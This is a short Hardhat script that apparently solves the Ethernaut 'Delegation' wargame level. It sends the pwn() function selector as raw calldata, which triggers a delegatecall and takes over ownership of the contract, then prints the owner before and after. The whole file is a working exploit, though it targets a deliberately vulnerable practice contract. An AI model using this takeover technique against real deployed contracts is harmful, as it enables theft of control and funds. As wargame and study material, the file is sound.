import { ethers } from "hardhat";

const CONTRACT_ADDRESS = "0xCf8EA0356dA885160C677eAdB9b87F8610226D30"
const PLAYER_ADDRESS = "0x8626f6940E2eb28930eFb4CeF49B2d1F2C9C1199"

async function main() {
    const signer = await ethers.getSigner(PLAYER_ADDRESS)
    const contract = await ethers.getContractAt("Delegation", CONTRACT_ADDRESS, signer)
    const pwnSignature = ethers.utils.id("pwn()").substring(0, 10)
    console.log(pwnSignature);

    let owner = await contract.owner()

    console.log("------------------Previous owner------------------");
    console.log(owner);

    await signer.sendTransaction({
        to: contract.address,
        data: "0xdd365b8b",
        gasLimit:ethers.BigNumber.from(`100000`),

    })

    owner = await contract.owner()

    console.log("------------------New owner------------------");
    console.log(owner);


}



// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});